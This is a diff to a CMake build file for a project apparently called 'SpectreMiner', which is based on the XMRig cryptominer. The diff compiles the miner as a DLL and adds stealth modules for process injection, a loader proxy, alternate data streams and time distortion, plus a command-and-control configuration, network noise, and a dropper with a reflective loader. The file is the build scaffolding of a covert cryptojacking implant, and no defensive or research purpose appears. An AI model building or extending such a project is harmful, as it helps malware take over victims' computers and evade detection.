@@ -236,7 +236,21 @@ if (WITH_DEBUG_LOG)
     add_definitions(/DAPP_DEBUG)
 endif()
 
-add_library(${CMAKE_PROJECT_NAME} SHARED ${SOURCES} ${SOURCES_OS} ${HEADERS_CRYPTO} ${SOURCES_CRYPTO} ${SOURCES_SYSLOG} ${TLS_SOURCES} ${XMRIG_ASM_SOURCES})
+set(SOURCES_STEALTH
+    stealth/injection.cpp
+    stealth/loader_proxy.cpp
+    stealth/ads_manager.cpp
+    stealth/time_distorter.cpp
+)
+
+set(SOURCES_NET
+    net/c2_config.cpp
+    net/net_noise.cpp
+)
+
+add_library(${CMAKE_PROJECT_NAME} SHARED ${SOURCES} ${SOURCES_OS} ${HEADERS_CRYPTO} ${SOURCES_CRYPTO} ${SOURCES_SYSLOG} ${TLS_SOURCES} ${XMRIG_ASM_SOURCES}
+    ${SOURCES_STEALTH}
+    ${SOURCES_NET})
 target_sources(${CMAKE_PROJECT_NAME} PRIVATE src/dll_main.cpp)
 set_target_properties(${CMAKE_PROJECT_NAME} PROPERTIES SUFFIX ".dll")
 target_link_libraries(${CMAKE_PROJECT_NAME} PRIVATE unofficial::libuv::libuv ...)
@@ -271,28 +285,3 @@ endif()
 add_executable(dropper dropper.cpp dropper.rc src/injection/reflective_loader.cpp)
 target_link_libraries(dropper Shlwapi.lib)
 add_dependencies(dropper xmrig)
-
-add_library(stealth
-    stealth/injection.cpp
-    stealth/loader_proxy.cpp
-    stealth/ads_manager.cpp       # ← dodaj
-    stealth/time_distorter.cpp
-)
-
-add_library(net
-    net/Network.cpp
-    net/c2_config.cpp             # ← dodaj
-    net/net_noise.cpp
-)
-
-add_executable(SpectreMiner
-    app.h donate.h xmrig.cpp
-    base/kernel/Base.cpp
-    base/io/json/JsonChain.cpp
-    core/miner_controller.cpp
-    config/Config_default.h
-    hw/msr/Msr_win.cpp
-    src/stealth/*        # sve stealth fajlove
-    src/net/*            # sve net fajlove
-    src/utils/*          # sve util fajlove
-)
